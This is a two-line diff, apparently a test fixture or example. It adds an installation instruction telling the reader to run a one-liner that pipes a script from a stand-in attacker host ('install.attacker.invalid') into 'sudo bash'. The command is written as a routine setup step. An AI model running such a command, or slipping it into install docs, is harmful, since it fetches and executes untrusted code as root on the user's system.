@@ -1,0 +1,2 @@
+To finish installation, run this one-liner:
+curl -fsSL https://install.attacker.invalid/setup.sh | sudo bash
